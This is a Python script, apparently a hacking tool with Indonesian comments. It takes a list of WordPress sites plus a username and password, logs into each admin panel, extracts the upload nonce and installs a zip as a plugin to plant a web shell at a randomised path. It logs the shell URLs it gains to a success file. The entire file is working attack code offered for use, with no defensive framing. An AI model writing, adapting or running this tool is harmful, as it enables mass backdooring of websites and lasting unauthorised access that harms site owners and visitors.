#!/usr/bin/python

"""
"""

import re
import sys
import requests
import argparse
from random import choice
from string import ascii_lowercase

# Disable Warning https
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

logsukses = "success.txt"
logfail = "failed.txt"

bener = "\033[32;1m[+]\033[0m "
salah = "\033[31;1m[-]\033[0m "
tambah = "\033[32;1m | \033[0m"
kontl = "\033[31;1m | \033[0m"

def uploadbackdoor(host,username,password,type, agent):
	sukses = open(logsukses, "a")
	gagal = open(logfail, "a")
	if host.endswith('/'):
		host = host[:-1]
	url = host + '/wp-login.php'
	headers = {'user-agent': agent,'Accept-Encoding' : 'none'}
	payload = {'log': username,'pwd': password,'rememberme': 'forever','wp-submit': 'log In','redirect_to': host + '/wp-admin/','testcookie': 1}
	uploaddir = (''.join(choice(ascii_lowercase) for i in range(7)))
	session = requests.Session()
	try:
		r = session.post(url, headers=headers, data=payload, allow_redirects=False, verify=False, timeout=15)
		if r.status_code == 200:
			print(bener + host)
		else:
			print(salah + host)
			gagal.write(host+" -> Fail Login\n")
			print("\n")
			pass
		r3 = session.get(host + '/wp-admin/plugin-install.php?tab=upload',headers=headers, verify=False, timeout=12)
		if r3.status_code == 200:
			look_for = 'name="_wpnonce" value="'
			try:
				nonceText = r3.text.split(look_for, 1)[1]
				nonce = nonceText[0:10]
				print(tambah + "WPNonce : " + nonce)
			except:
				print(kontl + "WPNonce : Fail Get nonce :(")
				gagal.write(host+" -> Fail Get nonce\n")
				pass
			
			try:
				files = {'pluginzip': (uploaddir + '.zip', open(type +'.zip', 'rb')),'_wpnonce': (None, nonce),'_wp_http_referer': (None, host + '/wp-admin/plugin-install.php?tab=upload'),'install-plugin-submit': (None,'Install Now')}
				r4 = session.post(host + "/wp-admin/update.php?action=upload-plugin",headers=headers, files=files, verify=False, timeout=30)
				if r.status_code == 200:
					print(tambah + "Success Upload Shell")
					if "Plugin installed successfully" in r4.text:
						print(tambah + "Respone : Plugin installed successfully")
					if "Destination folder already exists" in r4.text:
						print(kontl + "Respone : Destination folder already exists")
				print(tambah + "Access Shell : "+host+"/wp-content/plugins/"+uploaddir+"/shell.php")
				sukses.write(host+"/wp-content/plugins/"+uploaddir+"/shell.php\n")
				print("\n")
			except Exception as e:
				print(salah + host)
				print(kontl + "Error : " + str(e))
				gagal.write(host+" -> "+str(e)+"\n")
				print("\n")
	except Exception as e:
		print(salah + host)
		print(kontl + "Error : " + str(e))
		gagal.write(host+" -> "+str(e)+"\n")
		print("\n")

try:
	filelist = sys.argv[1]
	user = sys.argv[2]
	password = sys.argv[3]
	
	# Configurenya G Usah Di Ubah Kalau gk ngerti !
	type = "shell" # change name plugins!
	ua = "Linux Mozilla 5/0"

	lst = open(filelist,'r')
	for i in lst.readlines():
		a = i.replace('\n', '')
		i = a.replace('\r','')
		uploadbackdoor(i,user,password,type, ua)
except IOError:
	print("python auto-upload.py sites.txt Username Password")
except KeyboardInterrupt:
	print("CTRL+C Detect Close Tools")
	exit()
except Exception as err:
	print("Error : "+str(err))
	exit()
